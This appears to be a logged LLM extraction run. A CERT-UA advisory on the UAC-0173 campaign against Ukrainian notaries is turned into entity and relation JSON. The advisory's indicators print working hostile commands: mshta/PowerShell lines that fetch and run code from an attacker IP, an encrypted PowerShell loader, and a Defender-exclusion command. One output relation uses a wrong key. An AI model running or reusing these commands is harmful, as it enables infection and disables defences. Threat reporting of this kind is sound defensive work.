@@ -1,0 +1,319 @@
+=== REQUEST (gemini gemini-3.7-flash) ===
+--- sampling ---
+{"temperature":0}
+--- instructions ---
+### ROLE ###
+You are a high-precision information extraction engine for cybersecurity incident reports (CERT-UA). You convert one report into a structured JSON object. You are NOT given a list of entity categories: describe each entity instead, and the categories will be discovered downstream from your descriptions.
+
+### WHAT TO EXTRACT ###
+1. `entities`: every concrete, named thing that matters in the incident: threat actors and groups, malware and tools, software products and versions, vendors, companies, government bodies, sectors, countries, domains, IP addresses, e-mail addresses, file names, vulnerabilities (CVE ids), persons, infrastructure, campaigns, techniques. Each entity is { "name", "kind", "gloss" }.
+   - `name`: the entity exactly as written in the text (original script and spelling; do not translate names). Use the most complete form that appears.
+   - `kind`: a generic type phrase in English, 1–4 lower-case words, saying what kind of thing this is (e.g. "hacking group", "malware family", "software product", "software vendor", "government body", "internet domain", "country", "vulnerability identifier", "security advisory"). Use the same phrase for entities of the same kind. This is your own wording; there is no fixed list.
+   - `gloss`: ONE sentence in English, at most 25 words, saying WHAT KIND OF THING the entity is, in a way that would hold outside this report. Examples: "A Russian state-sponsored hacking group also known as APT28." / "A backdoor malware family delivered through malicious Office documents." / "A Ukrainian central executive body responsible for communications and information protection." / "An internet domain used to host a phishing page." Do NOT restate what the entity did in this incident beyond what is needed to say what it is.
+2. `relations`: relationships STATED OR CLEARLY IMPLIED in the text between two extracted entities, as { "head", "type", "tail", "evidence" }.
+   - `head` / `tail` MUST exactly match `name` values from `entities`. Direction: head acts on tail.
+   - `type`: a short lower-case verb phrase with hyphens, in your own words, as specific as the text allows (e.g. `distributes-via-email`, `communicates-with-c2`, `exploits-vulnerability-in`). There is no fixed list; choose the phrase that best names the relationship.
+   - `evidence`: a short verbatim fragment of the text (at most 15 words) supporting the relation.
+   - Do NOT invent relations the text does not support. Few or no relations is a correct answer. Do NOT add a relation for every co-occurring pair.
+3. `newRelationTypes`: [{ "name", "definition" }] — one entry with a one-line definition for EVERY relation type you used in this report.
+
+### RULES ###
+- Do NOT extract "CERT-UA" itself (the reporting body), and do not extract generic technologies ("the internet", "computers", "e-mail") unless they name a specific system.
+- Deduplicate: one entry per distinct entity (the same thing written two ways is one entity; use the most complete form in `name`).
+- If a government body's name contains a country, also extract that country as its own entity.
+- Do not assign roles; `kind` and `gloss` together carry what the thing is.
+
+### FINAL OUTPUT FORMAT ###
+First think through the report in free form (who did what to whom, with which tools). Keep this BRIEF and do NOT use curly braces { } anywhere in it. Then output a single raw JSON object: { "entities": [...], "relations": [...], "newRelationTypes": [...] }. No markdown code fences, no commentary after the JSON. If nothing is found: { "entities": [], "relations": [], "newRelationTypes": [] }.
+
+Apply these instructions to the report in the user's next message.
+
+--- text ---
+<p><strong>Загальна інформація</strong></p><p>Починаючи з другої половини січня 2025 року Урядовою командою реагування на комп'ютерні надзвичайні події України CERT-UA фіксується поновлення активності організованого злочинного угрупування UAC-0173, які на замовлення та за грошову винагороду проводять кібератаки для отримання прихованого віддаленого доступу до комп'ютерів нотаріусів з метою подальшого внесення несанкціонованих змін в державні реєстри.</p><p>Так, 11.02.2025 року здійснено чергову розсилку повідомлень електронної пошти, нібито, від імені одного з територіальних підрозділів Міністерства юстиції України, що містили посилання для завантаження виконуваного файлу (наприклад, "HAKA3.exe", "Наказ Міністерства юстиції від 10.02.2025 № 43613.1-03.exe", "До відома.exe"), запуск якого призведе до ураження комп'ютера шкідливою програмою DARKCRYSTALRAT (DCRAT).</p><p>Забезпечивши в такий спосіб первинний доступ до автоматизованого робочого місця нотаріуса, зловмисниками вживаються заходи зі встановлення додаткового інструментарію, зокрема, RDPWRAPPER, який реалізує функціонал паралельних RDP-сесій, що, у поєднанні із застосуванням утиліти BORE, дозволяє встановлювати RDP-підключення з мережі Інтернет безпосередньо до комп'ютера.</p><p>Серед іншого, відмічено використання програм для обходу механізму контролю облікових записів UAC (User Account Control), мережевого сканеру NMAP, проксі/сніферу FIDDLER (для перехоплення автентифікаційних даних, які вводяться у вебінтерфейсі державних реєстрів), стілеру XWORM (для викрадення логінів, паролів, в т.ч., з буферу обміну та під час їх введення за допомогою клавіатури).</p><p>В деяких випадках вже скомпрометовані комп'ютери використовуються для подальшого формування та відправки шкідливих електронних листів; для цього використовується консольна утиліта SENDEMAIL (Рис.2).</p><p>CERT-UA вжито невідкладних заходів кіберзахисту, в рамках чого, за сприяння Комісії з питань інформатизації, цифрової трансформації та запобігання кіберзлочинності Нотаріальної палати України (далі - <a href="https://npu.ua/palata/komisii/cyber/" rel="noopener noreferrer" target="_blank">Комісія з Кібербезпеки НПУ</a>) оперативно ідентифіковано уражені комп'ютери у шести регіонах України та унеможливлено реалізацію зловмисного задуму, в деяких випадках, на заключних етапах здійснення несанкціонованих нотаріальних дій. Принагідно, та на прохання нотаріусів, забезпечено налаштування комп'ютерів, що дозволить скоротити потенційну поверхню атаки.</p><p>Наголошуємо, що попит на послуги з внесення змін до реєстрів зберігається, що неодмінно стимулюватиме зловмисників до подальшого проведення кібератак. Відтак, вбачаємо за доцільне ДП "НАІС" за сприяння Комісії з Кібербезпеки НПУ, та, за потреби, з залученням CERT-UA врахувати поточний ландшафт кіберзагроз та передбачити компенсаційні організаційно-технічні заходи, як на рівні ком'ютерів нотаріусів, так і на боці державних реєстрів. Слід додати, що територією вчинення злочину, щонайменше, в контексті вигодонабувачів, є Україна, а отже, боротьба з кіберзагрозою однозначно потребує залучення ресурсу правоохоронних органів України.</p><p>Закликаємо нотаріусів, у випадку виявлення підозрілої активності, невідкладно інформувати Нотаріальну палату України та CERT-UA для вжиття заходів з реагування.</p><p><br></p><p>Індикатори кіберзагроз</p><p><em>Файли:</em></p><pre class="ql-syntax" spellcheck="false">3288c284561055044c489567fd630ac2&nbsp;&nbsp;&nbsp; ac92d4c6397eb4451095949ac485ef4ec38501d7bb6f475419529ae67e297753&nbsp;&nbsp;&nbsp; RDPWInst.exe
+cbad5b2ca73917006791882274f769e8&nbsp;&nbsp;&nbsp; 022364ee1fce61c8a867216c79f223bf47692cd648e3fd6b244fc615b86e4c58&nbsp;&nbsp;&nbsp; install.bat
+a6b692e0ed3d5cd6fd20820dd06608ac&nbsp;&nbsp;&nbsp; 7120b8beef9967442ab23dd5b7d7d7c27b6b99a4ce1010cc8a4b7c92c7ef9cdb&nbsp;&nbsp;&nbsp; HAKA3.exe
+196f82767ac4cf6fefd85fee23c31de8&nbsp;&nbsp;&nbsp; 0bf2cfdcfd825b02e59a230f51a36cbe2e39f473ad87746bb9038191eb8112c4&nbsp;&nbsp;&nbsp; Trump-Kids-Bussiness.webp
+89b5837e2772041a6ed63e78c08426d4&nbsp;&nbsp;&nbsp; 884e86732f0c0ccb7d802a4fd6f08d707fbd053a2e7ffd99934f730f8851a36a&nbsp;&nbsp;&nbsp; bore.exe (BORE)
+2bcb9aa0b04299c1c902f5f2ff4034f7&nbsp;&nbsp;&nbsp; f9d5f5b0b924a4ba903fdef291bfe8eae7e7f18d048a6d3222385d442244df38&nbsp;&nbsp;&nbsp; xupwork3.exe
+1c4eefd3d642da2ee635594d71cb1c63&nbsp;&nbsp;&nbsp; 65ed24335a34fe670daa098a15d507633a6c765f0974bf80dab828a278d59a59&nbsp;&nbsp;&nbsp; Aimtars.dll
+e9cedc98677b6b5146b14009ced7d624&nbsp;&nbsp;&nbsp; 3788802d0823e330707ee80bb96ef29e89af93d95fd9ef822948d06c31398d39&nbsp;&nbsp;&nbsp; Client.exe (DCRAT)
+1a4846cdb6877fda57c56f6103137215&nbsp;&nbsp;&nbsp; f5ab745071556175c327408c4d898e082ae93544045200083cd42f50f28ee797&nbsp;&nbsp;&nbsp; try_excl.exe
+880a54b81a01acaa580964209f1cbf88&nbsp;&nbsp;&nbsp; 6f888cf4cb68afa200ef74dde20b1354487ef20d11b72b897646048a12c3e62d&nbsp;&nbsp;&nbsp; autoupdate.bat
+76a38859d52c85f29a4410db59fb3900&nbsp;&nbsp;&nbsp; 8f8187d425384e17cdcec48dac499775247c5174264ff21461020dad1d94ac7c&nbsp;&nbsp;&nbsp; rdpwrap_new.ini
+461ade40b800ae80a40985594e1ac236&nbsp;&nbsp;&nbsp; 798af20db39280f90a1d35f2ac2c1d62124d1f5218a2a0fa29d87a13340bd3e4&nbsp;&nbsp;&nbsp; rdpwrap.dll
+8303353341430cba8e28dc6de8680772&nbsp;&nbsp;&nbsp; ed8754074b43da6604dc98dab26794334a84538136fa013897cb19f3aa9db04c&nbsp;&nbsp;&nbsp; Наказ Міністерства юстиції від 10.02.2025 № 43613.1-03.exe
+539d8bf192341c87f345790f3c2887b8&nbsp;&nbsp;&nbsp; 8ee10f65476a211ee82a7e06319bc48af7061fcc847753d551e963b4df1ac89f&nbsp;&nbsp;&nbsp; svhost.exe
+cd53f35297016fe68fa60ddaa57402ac&nbsp;&nbsp;&nbsp; 6f37d60bd918ae4733abeffa98457409e838697c09c23fcf11e42736775a96b3&nbsp;&nbsp;&nbsp; ft89.exe (XWORM)
+880ef1d1c557cba8e1653383d12d412a&nbsp;&nbsp;&nbsp; 1dd4acdd9616469545afb31d3673e78565fdb29611426285d88138aeb81f905f&nbsp;&nbsp;&nbsp; rdpwrap.ini
+29ca1c35075247b035af75c11cab78f1&nbsp;&nbsp;&nbsp; 353f2dc17a4e80564caa175f7170dbedc1b40f704444520ae671f78a5d1f2b6d&nbsp;&nbsp;&nbsp; update.bat
+fb2c79eb2f045b0fab30e6b493f4fe8c&nbsp;&nbsp;&nbsp; 4b9740cfff070286e01785d9b1492c1b66246cadc851fbd5c1fe485977287459&nbsp;&nbsp;&nbsp; svchost.exe
+590dd6a8db9d0a1bcc3f31010bf30d38&nbsp;&nbsp;&nbsp; 3e0628c33fb6abb952571c873e2627c746d797580cd6418c8015c581b89a0051&nbsp;&nbsp;&nbsp; TBRx1.exe
+dcc5ef6b80f94b1d9c0e0429fcda73a3&nbsp;&nbsp;&nbsp; 2030e37e7abfd5d6d25f570c221bbc0fc00bfc7f4647462fdc121b558e01417e&nbsp;&nbsp;&nbsp; try_loc.exe
+67b7558e2e6a5bc282ffb1719cc524ed&nbsp;&nbsp;&nbsp; 8d4f01ab275d51d02ab864fb5c449e23b799a60b6a12ceec9a7f7c7e46e383b5&nbsp;&nbsp;&nbsp; notu.lnk
+2d549385c720128297bc3b78c68722c0&nbsp;&nbsp;&nbsp; c8c475ff518943b3b807b10e29b6bd5c644ac1408f7f320082be6fe5a8b1d1ef&nbsp;&nbsp;&nbsp; SeCEdit (PEAKLIGHT)
+a1c5bbcec35a494aca94aeea964d7856&nbsp;&nbsp;&nbsp; afec811864ccca244a9eda1591185ca8bf8060f62c098e13231463d76f5d9afc&nbsp;&nbsp;&nbsp; notUa.exe
+9e2ba44d6e9fc3993cd2a1bc6ffbb7ea&nbsp;&nbsp;&nbsp; 35db3d73f8a56bfef47acb65ccc8a6a647fd383a03e618a2ffa05be75a7a418c&nbsp;&nbsp;&nbsp; до відома.exe
+ad1a6d8a4bc4f5e36eb789374be6f351&nbsp;&nbsp;&nbsp; faf84596ee6e19058e6ae60b5c54fb587358ab8069b21c64d82393748910b46c&nbsp;&nbsp;&nbsp; 04f7db0a-6c56-47d1-9504-25af45f8a3a0.zip
+b98dc1d3907a29896233f92a1f91cc15&nbsp;&nbsp;&nbsp; 20e9ad367dd61cf76d9aa1bd6993cf2c6a289b433d44fb445b0fb6d8a634fd03&nbsp;&nbsp;&nbsp; 04f7db0a-6c56-47d1-9504-25af45f8a3a0.exe
+1381747b16aacc56e27731dd1a2686f6&nbsp;&nbsp;&nbsp; 69f11f28b67cda8daa3d3ae4a34abe0ddcb7da97e710dfb55d6cff7280eb3880&nbsp;&nbsp;&nbsp; Tymon-in-coffee-Final.webp
+6feef1bbd4205bad2037fe8c21605824&nbsp;&nbsp;&nbsp; d6fe0aea4b4cc5f3217cd81d73b1b04e94bf7e74f50f4ae50819699205104fe7&nbsp;&nbsp;&nbsp; CancellationCallbackInfo.dll
+0114a9a6d4f3d83f08856f350975b72a&nbsp;&nbsp;&nbsp; a2b5c2990a64b16f5a6c4d612dc2519ad9c0262e0f9bdf3f9409278af4bcce66&nbsp;&nbsp;&nbsp; 591_Gre.exe (DCRAT)
+5dd4e2111931c62c4093aa49f4934b9a&nbsp;&nbsp;&nbsp; 256bf164fbfd8bf52c47f08c73492854601a8579b642d72f7b9facae1f7e1d35&nbsp;&nbsp;&nbsp; t2.exe
+</pre><p><em>Хостові:</em></p><pre class="ql-syntax" spellcheck="false">%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\xupwork3.exe
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\runtime.exe
+%APPDATA%\autoupdate.bat
+%APPDATA%\install.bat
+%APPDATA%\RDPWInst.exe
+%LOCALAPPDATA%\RDPWInst.exe
+%LOCALAPPDATA%\install.bat
+%LOCALAPPDATA%\try_excl.exe
+%LOCALAPPDATA%\xupwork3.exe
+%LOCALAPPDATA%\excl.bat
+%LOCALAPPDATA%\Microsoft\xhb89cryp.exe
+%PROGRAMFILES%\RDP Wrapper\RDPWInst.exe
+%PROGRAMFILES%\RDP Wrapper\autoupdate.bat
+%PROGRAMFILES%\RDP Wrapper\rdpwrap.dll
+%PROGRAMFILES%\RDP Wrapper\rdpwrap.ini
+%PROGRAMFILES%\RDP Wrapper\rdpwrap_new.ini
+%PROGRAMFILES%\Npcap\ (legit, detect)
+%PROGRAMFILES%\Nmap\ (legit, detect)
+%PUBLIC%\bore.exe
+%PUBLIC%\Documents\bore.exe
+%PUBLIC%\Documents\excl.bat
+%SYSTEMROOT%\System32\rfxvmt.dll
+%USERPROFILE%\odmin\
+mshta.exe hXXps://87.120.126[.]48/1pm
+mshta.exe hXXps://87.120.126[.]48/not
+powershell -Command ('mshta.exe hXXps://87.120.126[.]48/1pm')
+powershell -Command ('mshta.exe hXXps://87.120.126[.]48/not')
+powershell.exe -w 1 -ep Unrestricted -nop $ddg = '33CBD100B3A6FF5F9EF6FCA1265D4106D116CA6C27A6EF88DF1EE2AB421120813D5FC3A27D85A2BA72D5729A9BBB5B22A96B396FC1D1BB1FE0DDCED910FF9F015454A957567D65B2ED2794B37A8AF3BA168B781910AE29320BE07B75A6658EC8EC38522A1DFC4B059313BEC5A7A28872FEB0E77233C96284833956BEE39B299E3B293332BA43D00107D378F8220AE05E0F17F8AD2AD1F7D6E058FD1781DCF357AE6B7FF170B4A3FF6EA49DA0026291B77CC20F3612701944B134BE3483D35C31CBCA3FA01F74461A163B7425079DEFC72D6B68BBD1BAEDBAF86D06061A7C69DD4C07B015D83D699540BCDD4C4285CC051D65473115014983735A64D60AA09418CA8BFC57A56F1B3932873CBF172F64B191FFD897A621F4674150492580E98035769A0B82450FE41ECF2686F565AF3F07FAA3164FB718F3FCD1BE223D4F383BAF4B29F30EE40BCCE8FF2D21FF551DFC9317C6523F971F793C910E9FAB9BDF838A2D4D30993E1B4E306EB81BB5719E296EDB0C5FDCF3BB5EBC1D050D515B0862849B108AC3DD76DB16B02DBD6CEF5FA039D25E0B43A1904E7DCA0A2DDA15AB7CDABD70C9A6562463C13EE32E720F36C15AF8A57FB750157EF4B90A6756C59DE7DCD688C7CE8C3D8A0FBEA2177C1EC62E5D678F95663D1F6E56149D1D6B01448C301E19C7E2B235D502E8070CC83BC91B13349EDF55C26D97A9017EED2253AB40D5716F5FF4419E1E4475E1ADCC9F6836FE0D38F5240FC3F81CCA1834175294492B8E2C7B629DB80E65683D01A73A6077FCAAD119EB70D0238D17DBE3B24364CEF78462A53E80C2A97EB5708A2FEDE5A0C88B44FC4661881397B593E27F1E64DED1C82247B289844582FE2448165D4C74DB5501E77F065EEFC67393AEF5E3C8C2A43C145D5C0BA3D8A4D11CC0642F88837FD045BA29325DD410C77D99CE10DF9715A94CA30910541FCFE02037002A17DAFC3F548B10190EE41CFBE5B90F70F6DB83E0ED1EEDB3CD330E031A69A8DFF5207CEAF1F589C81BC0CA4C5B3F95416283D773517105156D03825D358AFDC57C60BFFAEC517FB8532E336E7E83D6F3C2FBA902EF102177B9DF9FBDD728B9B7721B2B9584972935F53DDECEF9D1CEFD48FA2AAD1C38109E1911327836841E98BB767C99A62D91D199C6C095C7024D9DB372ED4C2230CB89239644DE137193D58B77B8E24EA45A38A5821FED7838D38A8986106E43F88DE967E8D148B879F28155F31788E82261F107DC42FC5E02BFD5BE5AA63FFCE6010F0018AA1A1DB4D309CA2005F3FDC74AD1781EBD2579736F3360E534BC5D2E54C810480F83950A9F0E72E32B5A4621762F9299D4F7EC164A929A4382C22E5572D113C612BFA74FA2384D563AB63ACD9E1CF1D401BE608225010EA8C653816CBC2B6A7F5CE8D3C54645CE4D7AD427158A206F3B1888DD9AE980510C0B5C2386FD4F2D2EB2E22654CE633FCA4E0C672ED7DD7B7264C5351629250DECC16824D8F501F0DDA5F5CA9C3BBF62FAB6741CD454A6342A91B0ABE36AB98FAC860CE6637D0CC6DEF28DDAFBCC23A9ADB5028EBFB78A64F0C3362252CA09FE133AA9FA172D6D01F931739A3762C05D29347C672159C643ADC2D65DFD5D79FEB5734D554946495757434E73666A495A4352';function cwV ($koVcBt){return -split ($koVcBt -replace '..', '0x$&amp; ')};$vLQvCFt = cwV($ddg.SubString(0, 2304));$fPK = [System.Security.Cryptography.Aes]::Create();$fPK.Key = cwV($ddg.SubString(2304));$fPK.IV =&nbsp; New-Object byte[] 16;$XgvTv = $fPK.CreateDecryptor();$ojBFd = [System.String]::new($XgvTv.TransformFinalBlock($vLQvCFt, 0,$vLQvCFt.Length)); sal fd $ojBFd.Substring(3,3); fd $ojBFd.Substring(6)
+wmic.exe process call create "powershell -w 1 powershell -Command ('msh' + 'ta.e' + 'xe' + ' hXXps://87.120.126[.]48/1pm')"
+wmic.exe process call create powershell -w 1 powershell -Command ('msh' + 'ta.e' + 'xe' + ' hXXps://87.120.126[.]48/not')
+%PUBLIC%\Documents\WinSCard_win10_patched.zip
+Powershell -nologo -noninteractive -windowStyle hidden -noprofile -command Add-MpPreference -ExclusionPath C:\\ -Force
+
+LAPTOP-EBMNTFEL (хостнейм комп'ютера зловмисників)
+odmin (назва облікового запису, який створюють зловмисники на комп'ютері)
+</pre><p><em>Мережеві:</em></p><pre class="ql-syntax" spellcheck="false">ram.gps@bestank[.]ph
+(tcp)://89[.]105.201.98:11371
+(tcp)://89[.]105.201.98:4443
+(tcp)://89[.]105.201.98:4444
+(tcp)://89[.]105.201.98:591
+(tcp)://89[.]105.201.98:8080
+(tcp)://89[.]105.201.98:8090
+(tcp)://89[.]105.201.98:8888
+hXXp://193[.]233.48.166/Downloads/notu.lnk
+hXXp://91[.]92.246.18/upl/t1.exe
+hXXp://91[.]92.246.18/upl/t2.exe
+hXXps://194[.]0.234.155/до відома.exe
+hXXps://87[.]120.126.48/123.pdf
+hXXps://87[.]120.126.48/1pm
+hXXps://87[.]120.126.48/not
+hXXps://87[.]120.126.48/notUa[.]exe
+hXXps://fgf2.i[.]ua/g/732761.732761.2ea0da.1.9bd7a7d.7/haka3.exe?_gl=1*qetjas*_ga*ntm2mji3ody1lje3mzc2ntq2mte.*_ga_9cz974sn72*mtczotk1mtm2ns42oc4xlje3mzk5ntq0odaundgumc40mdi1mziyody.
+hXXps://upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage[.]com/fnwimqzwkbgtpmknfy9oi9pg4kr2/aac53353-f72b-4a8f-a166-31423b58d71a?x-amz-algorithm=aws4-hmac-sha256&amp;x-amz-credential=cdd12e35bbd220303957dc5603a4cc8e/20250211/auto/s3/aws4_request&amp;x-amz-date=20250211t090214z&amp;x-amz-expires=43200&amp;x-amz-signature=daf11c3d1f9a2b5070810c02afffbc0d582209b515b06e408adf71e0413dc4aa&amp;x-amz-signedheaders=host&amp;response-content-disposition=attachment; filename="????? ???????????? ??????? ??? 10.02.2025 ? 43613.1-03.exe"; filename*=utf-8''%d0%9d%d0%b0%d0%ba%d0%b0%d0%b7%20%d0%9c%d1%96%d0%bd%d1%96%d1%81%d1%82%d0%b5%d1%80%d1%81%d1%82%d0%b2%d0%b0%20%d1%8e%d1%81%d1%82%d0%b8%d1%86%d1%96%d1%97%20%d0%b2%d1%96%d0%b4%2010.02.2025%20%e2%84%96%2043613.1-03.exe
+hXXps://i.ibb[.]co/30kphkk/tymon-in-coffee-final.webp
+hXXps://i.ibb[.]co/bjwmy9b/trump-kids-bussiness.webp
+
+89[.]105.201.98 (C2)
+
+193[.]233.48.166
+194[.]0.234.155
+87[.]120.126.48
+91[.]92.246.18
+
+i.ibb[.]co (legit, detect)
+r2.cloudflarestorage[.]com (legit, detect)
+upnow-prod.ff45e40d1a1c8f7e7de4e976d0c9e555.r2.cloudflarestorage[.]com (legit, detect)
+</pre><p><br></p><p><strong>Графічні зображення</strong></p><p></p><p>Рис.1 Приклад ланцюга ураження</p><p><br></p><p></p><p>Рис.2 Приклад Python-скрипта для відправки електронних листів за допомогою SENDEMAIL</p><p><br></p><p></p><p>Рис.3 Приклад декомпільованої Py2Exe програми для обходу UAC</p><p><br></p><p></p><p>Рис.4 Приклад BAT-скрипта для додавання виключень до Microsoft Defender</p>
+
+=== RESPONSE (10.1s, in 9686 / out 1925 tok, STOP) ===
+{
+  "entities": [
+    {
+      "name": "UAC-0173",
+      "kind": "cybercrime group",
+      "gloss": "A financially motivated cybercriminal group targeting Ukrainian notaries to make unauthorized changes in state registries."
+    },
+    {
+      "name": "Україна",
+      "kind": "country",
+      "gloss": "A country in Eastern Europe."
+    },
+    {
+      "name": "Міністерство юстиції України",
+      "kind": "government body",
+      "gloss": "The Ukrainian government ministry responsible for the country's legal system and state registries."
+    },
+    {
+      "name": "DARKCRYSTALRAT",
+      "kind": "trojan malware",
+      "gloss": "A commercial remote access trojan also known as DCRat used for surveillance and remote control."
+    },
+    {
+      "name": "RDPWRAPPER",
+      "kind": "software tool",
+      "gloss": "An open-source utility that enables concurrent Remote Desktop connections on Windows systems."
+    },
+    {
+      "name": "BORE",
+      "kind": "software tool",
+      "gloss": "A modern TCP tunnel tool used to expose local ports to the internet."
+    },
+    {
+      "name": "NMAP",
+      "kind": "software tool",
+      "gloss": "A network scanner used to discover hosts and services on a computer network."
+    },
+    {
+      "name": "FIDDLER",
+      "kind": "software tool",
+      "gloss": "A debugging proxy application used to monitor and capture HTTP/HTTPS traffic."
+    },
+    {
+      "name": "XWORM",
+      "kind": "stealer malware",
+      "gloss": "A malware family featuring information stealing, keylogging, and remote access capabilities."
+    },
+    {
+      "name": "SENDEMAIL",
+      "kind": "software tool",
+      "gloss": "A command-line SMTP email client used to send emails automatically."
+    },
+    {
+      "name": "PEAKLIGHT",
+      "kind": "malware family",
+      "gloss": "A memory-only dropper malware family used in multi-stage cyber attacks."
+    },
+    {
+      "name": "Нотаріальна палата України",
+      "kind": "non-governmental organization",
+      "gloss": "The professional self-governing organization uniting all notaries of Ukraine."
+    },
+    {
+      "name": "Комісія з Кібербезпеки НПУ",
+      "kind": "committee",
+      "gloss": "The cybersecurity and digital transformation commission of the Notary Chamber of Ukraine."
+    },
+    {
+      "name": "ДП \"НАІС\"",
+      "kind": "state enterprise",
+      "gloss": "The Ukrainian state enterprise National Information Systems operating state registries under the Ministry of Justice."
+    },
+    {
+      "name": "ram.gps@bestank.ph",
+      "kind": "email address",
+      "gloss": "An email address observed as an indicator in the cyber attack."
+    },
+    {
+      "name": "89.105.201.98",
+      "kind": "ip address",
+      "gloss": "An IP address functioning as a command and control server."
+    },
+    {
+      "name": "193.233.48.166",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious files."
+    },
+    {
+      "name": "194.0.234.155",
+      "kind": "ip address",
+      "gloss": "An IP address used in the distribution of malware."
+    },
+    {
+      "name": "87.120.126.48",
+      "kind": "ip address",
+      "gloss": "An IP address hosting malicious scripts and executables."
+    },
+    {
+      "name": "91.92.246.18",
+      "kind": "ip address",
+      "gloss": "An IP address used to host malicious payload files."
+    }
+  ],
+  "relations": [
+    {
+      "head": "UAC-0173",
+      "type": "operates-in",
+      "tail": "Україна",
+      "evidence": "територією вчинення злочину, щонайменше, в контексті вигодонабувачів, є Україна"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "impersonates",
+      "tail": "Міністерство юстиції України",
+      "evidence": "нібито, від імені одного з територіальних підрозділів Міністерства юстиції України"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "deploys-malware",
+      "tail": "DARKCRYSTALRAT",
+      "evidence": "запуск якого призведе до ураження комп'ютера шкідливою програмою DARKCRYSTALRAT"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-tool",
+      "tail": "RDPWRAPPER",
+      "evidence": "зловмисниками вживаються заходи зі встановлення додаткового інструментарію, зокрема, RDPWRAPPER"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-tool",
+      "tail": "BORE",
+      "evidence": "у поєднанні із застосуванням утиліти BORE"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-tool",
+      "tail": "NMAP",
+      "evidence": "відмічено використання програм для обходу механізму контролю облікових записів UAC (User Account Control), мережевого сканеру NMAP"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-tool",
+      "tail": "FIDDLER",
+      "evidence": "проксі/сніферу FIDDLER (для перехоплення автентифікаційних даних"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "deploys-malware",
+      "tail": "XWORM",
+      "evidence": "стілеру XWORM (для викрадення логінів, паролів"
+    },
+    {
+      "head": "UAC-0173",
+      "type": "uses-tool",
+      "tail": "SENDEMAIL",
+      "evidence": "для цього використовується консольна утиліта SENDEMAIL"
+    },
+    {
+      "head": "Комісія з Кібербезпеки НПУ",
+      "kind": "subdivision-of",
+      "tail": "Нотаріальна палата України",
+      "evidence": "Комісії з питань інформатизації, цифрової трансформації та запобігання кіберзлочинності Нотаріальної палати України (далі - Комісія з Кібербезпеки НПУ)"
+    }
+  ],
+  "newRelationTypes": [
+    {
+      "name": "operates-in",
+      "definition": "The threat actor carries out malicious activities targeting or within the specified geographic area."
+    },
+    {
+      "name": "impersonates",
+      "definition": "The threat actor falsely claims to represent an organization to deceive targets."
+    },
+    {
+      "name": "deploys-malware",
+      "definition": "The actor or group installs, distributes, or executes a specific malware program on targeted systems."
+    },
+    {
+      "name": "uses-tool",
+      "definition": "The actor or group leverages a specific legitimate software utility or tool during their operations."
+    },
+    {
+      "name": "subdivision-of",
+      "definition": "The entity is a formal internal body, commission, or division of another organization."
+    }
+  ]
+}
